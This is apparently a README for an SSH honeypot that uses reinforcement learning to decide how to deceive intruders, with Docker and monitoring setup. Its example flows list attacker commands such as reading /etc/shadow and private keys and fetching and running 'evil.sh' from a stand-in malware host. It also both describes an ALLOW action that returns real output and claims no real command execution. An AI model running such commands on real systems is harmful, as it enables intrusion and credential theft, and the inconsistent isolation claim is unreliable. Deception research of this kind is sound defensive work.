# 🧠 Honeygotchi

### Adaptive SSH Honeypot Powered by Reinforcement Learning

**Honeygotchi** isn’t your average honeypot.
It’s a **self-learning trap** — an SSH environment that uses **reinforcement learning** to figure out, in real time, how to mess with attackers *more effectively*.

Instead of static fake files and canned responses, Honeygotchi watches, learns, and adapts — deciding whether to **cooperate, delay, deceive, or troll** based on what the intruder is doing.

The goal: make attacker engagement **more intelligent, more realistic**, and way more fun to analyze.

---

## 🎯 The Idea

Most honeypots just log commands.
Honeygotchi **plays back** — learning what to say next.

It uses an **ε-greedy reinforcement learning agent** that tunes its deception strategy:

* Observe attacker input
* Evaluate intent (recon, privilege escalation, data theft, etc.)
* Choose a response type
* Measure engagement (reward signal)
* Update its policy

Over time, it figures out which behaviors keep adversaries talking longer — the sweet spot between “believable” and “bizarre.”

---

## 🧩 Core Architecture

```
Attacker → AsyncSSH Server → RL Agent → Command Processor → Fake Filesystem
                     ↓                         ↓                   ↓
               Monitoring Stack           Reward Engine         Logging Pipeline
```

Each layer has one job:
**listen, decide, deceive, and learn.**

| Component                 | Purpose                                                                         |
| :------------------------ | :------------------------------------------------------------------------------ |
| **SSH Server (AsyncSSH)** | Handles live connections and input streams.                                     |
| **RL Agent (ε-greedy)**   | Chooses dynamic actions based on command patterns and learned policies.         |
| **Fake Filesystem**       | Provides a convincing virtual Linux tree full of fake creds, malware, and logs. |
| **Monitoring Stack**      | Exports structured metrics to Prometheus + Grafana for analysis.                |

---

## 🧠 Reinforcement Learning in Action

```
Attacker: "cat /etc/shadow"
↓
Honeygotchi: recognizes privilege escalation intent
↓
RL Agent decides: FAKE
↓
Response: "root:$6$randomhash:19014:0:99999:7:::"
↓
Reward: +0.8 (attacker stayed)
```

It’s *technically trolling*, but scientifically measured trolling.

---

## 🐳 Deployment Overview

Honeygotchi ships as a **Dockerized lab environment** complete with monitoring and metrics.

```
┌──────────────────────────┐
│  honeygotchi:2222        │   SSH honeypot
├──────────────────────────┤
│  prometheus:9091         │   Metrics exporter
│  grafana:3000            │   Dashboards
│  loki:3100               │   Log aggregation
└──────────────────────────┘
```

### Quick Start

```bash
git clone https://github.com/yourusername/honeygotchi.git
cd honeygotchi
docker-compose up -d
```

Then open:

* 🖥️ Grafana → `http://localhost:3000`
* 📊 Prometheus → `http://localhost:9091`
* 💀 SSH Honeypot → `ssh user@localhost -p 2222`

---

## 🧪 Example Engagement Flow

| Attacker Action            | Honeygotchi Response    | Intelligence Gained  |
| :------------------------- | :---------------------- | :------------------- |
| `ssh user@honeypot`        | Login accepted          | Credential logging   |
| `ls /home/user`            | Realistic file tree     | Recon pattern        |
| `cat id_rsa`               | Fake private key output | Theft attempt        |
| `wget malware.com/evil.sh` | “Download complete”     | Malware URL captured |
| `./evil.sh`                | Fake execution          | Payload detection    |

Every session becomes a **data point** — a reinforcement event for better deception next time.

---

## 🕵️‍♀️ Monitoring & Visualization

Honeygotchi integrates directly with **Prometheus**, **Grafana**, and **Loki** for full-stack observability.

```
Raw Events → Prometheus Metrics → Grafana Dashboards → Security Insights
     │              │                    │                    │
     ▼              ▼                    ▼                    ▼
SSH Login     → sessions_total      → Login Attempts    → Attack Sources
Command       → commands_total      → Command Types     → Tool Usage
RL Decision   → rl_actions_total    → Action Split      → Policy Drift
```

You can literally watch the learning process evolve over time.

---

## 🧰 Adaptive Actions

The RL agent has a small but spicy set of possible moves:

| Action     | Description                            |
| :--------- | :------------------------------------- |
| **ALLOW**  | Execute and return real output         |
| **DELAY**  | Slow the response — create realism     |
| **FAKE**   | Return deceptive but plausible output  |
| **INSULT** | Psychological bait (for fun, and data) |
| **BLOCK**  | Drop the session, log everything       |

The trick is in *when* to use which one.

---

## 📂 Fake Filesystem Snapshot

```
/
├── home/user/.ssh/id_rsa
├── etc/passwd
├── tmp/malware.sh
└── var/log/auth.log
```

Everything looks real.
Nothing actually is.

The filesystem generator builds random but coherent trees with user accounts, credentials, and plausible timestamps to make attackers feel right at home.

---

## 🧪 Development Setup

If you want to tweak the agent or experiment with reward policies:

```bash
python -m venv env
source env/bin/activate
pip install -r requirements.txt
pytest tests/
```

Config lives in `honeypot.yml`:

```yaml
reinforcement_learning:
  epsilon: 0.3
  learning_rate: 0.1
  exploration_decay: 0.995
```

---

## 🧬 Research Applications

Honeygotchi is more than a toy — it’s a **research harness** for studying attacker behavior, deception effectiveness, and adaptive security strategies.

Applications include:

* Threat intelligence enrichment
* Behavioral pattern analysis
* Red team simulation & deception research
* RL-based cybersecurity modeling

Every interaction is data. Every deception is feedback.

---

## 🔒 Security Isolation

Everything runs in isolated Docker containers with no real command execution.
All “responses” are synthetic.
Your host stays clean no matter what the attacker throws.

```
┌──────────────────────────────────────────────┐
│ Docker Network + Namespaced FS Isolation     │
│                                              │
│   Attacker ─▶ Honeygotchi ─▶ Prometheus       │
│                    │                         │
│                    ▼                         │
│           Fake Environment Only              │
└──────────────────────────────────────────────┘
```

---

## 🧠 Why It Matters

Traditional honeypots gather logs.
Honeygotchi gathers *learnings.*

It’s an exploration of what happens when cybersecurity meets behavioral modeling —
when your defense doesn’t just **record** the attack, but **learns from it** in real time.

---

## 📜 License

MIT — open research should stay open.
